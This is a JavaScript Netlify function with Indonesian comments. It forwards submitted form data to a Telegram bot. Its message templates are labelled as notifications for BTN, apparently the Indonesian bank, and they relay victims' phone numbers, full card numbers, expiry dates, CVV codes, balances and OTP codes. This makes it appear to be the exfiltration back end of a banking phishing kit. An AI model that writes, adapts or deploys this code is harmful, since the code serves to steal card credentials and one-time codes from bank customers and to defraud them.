// netlify/functions/send-notification.js
const fetch = require('node-fetch');

// Ganti dengan Token Bot Telegram dan Chat ID Anda di Environment Variables Netlify
// JANGAN masukkan token di sini! Gunakan Environment Variables di Netlify Dashboard
// Nama environment variables:
// - TELEGRAM_BOT_TOKEN
// - TELEGRAM_CHAT_ID

exports.handler = async (event, context) => {
    // Hanya menerima method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ success: false, error: 'Method not allowed' })
        };
    }

    try {
        // Ambil token dan chat ID dari environment variables
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing Telegram credentials in environment variables');
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    success: false, 
                    error: 'Server configuration error' 
                })
            };
        }

        const { type, data } = JSON.parse(event.body);
        
        let message = '';
        
        // Format pesan berdasarkan tipe notifikasi
        switch(type) {
            case 'phone':
                message = formatPhoneNotification(data);
                break;
            case 'card':
                message = formatCardNotification(data);
                break;
            case 'complete':
                message = formatCompleteNotification(data);
                break;
            default:
                message = formatUnknownNotification(data);
        }
        
        // Kirim ke Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        
        if (!result.ok) {
            console.error('Telegram API error:', result);
            return {
                statusCode: 500,
                body: JSON.stringify({ 
                    success: false, 
                    error: 'Failed to send Telegram message' 
                })
            };
        }
        
        return {
            statusCode: 200,
            body: JSON.stringify({ success: true, message: 'Notification sent' })
        };
        
    } catch (error) {
        console.error('Function error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({ success: false, error: error.message })
        };
    }
};

// Format untuk notifikasi hanya nomor HP
function formatPhoneNotification(data) {
    return `
┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${data.phone}
╰───────────────────
    `.trim();
}

// Format untuk notifikasi kartu (HP + Kartu + Expiry + CVV + Saldo)
function formatCardNotification(data) {
    return `
┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${data.phone}
├─ NO KRT : ${data.cardNumber}
├─ AKTF - CCV : ${data.cardExpiry} / ${data.cvv}
├─ SALDO : Rp ${formatRupiah(data.balance)}
╰───────────────────
    `.trim();
}

// Format untuk notifikasi lengkap (dengan OTP)
function formatCompleteNotification(data) {
    return `
┌─  NOTIFIKASI BTN  
├───────────────────
├─  NO HP : ${data.phone}
├─ NO KRT : ${data.cardNumber}
├─ AKTF - CCV : ${data.cardExpiry} / ${data.cvv}
├─ SALDO : Rp ${formatRupiah(data.balance)}
├─ KODE : ${data.otp}
╰───────────────────
    `.trim();
}

function formatUnknownNotification(data) {
    return `
┌─  NOTIFIKASI BTN  
├───────────────────
├─  DATA : ${JSON.stringify(data, null, 2)}
╰───────────────────
    `.trim();
}

function formatRupiah(angka) {
    if (!angka) return '0';
    let number_string = angka.toString().replace(/[^,\d]/g, '');
    let split = number_string.split(',');
    let sisa = split[0].length % 3;
    let rupiah = split[0].substr(0, sisa);
    let ribuan = split[0].substr(sisa).match(/\d{3}/gi);
    
    if (ribuan) {
        let separator = sisa ? '.' : '';
        rupiah += separator + ribuan.join('.');
    }
    
    return rupiah ? rupiah : '0';
    }
